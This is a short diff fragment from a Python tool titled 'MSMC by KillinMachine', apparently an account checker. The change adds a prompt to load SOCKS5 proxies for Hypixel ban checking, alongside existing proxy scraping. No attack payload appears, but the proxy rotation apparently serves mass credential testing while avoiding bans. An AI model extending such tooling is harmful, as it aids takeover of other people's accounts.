+            banproxyload()
+
 def Main():
     global proxytype, screen
     utils.set_title("MSMC by KillinMachine")
@@ -658,9 +765,12 @@ def Main():
     if proxytype != "'4'" and proxytype != "'5'":
         print(Fore.LIGHTBLUE_EX+"Select your proxies")
         Proxys()
+    if config.get('proxylessban') == False and config.get('hypixelban') is True:
+        print(Fore.LIGHTBLUE_EX+"Select your SOCKS5 Ban Checking Proxies.")
+        banproxyload()
     if proxytype =="'5'":
         print(Fore.LIGHTGREEN_EX+"Scraping Proxies Please Wait.")
-        threading.Thread(target=get_proxies, args=()).start()
+        threading.Thread(target=get_proxies).start()
         while len(proxylist) == 0: 
             time.sleep(1)
     if not os.path.exists("results"): os.makedirs("results/")
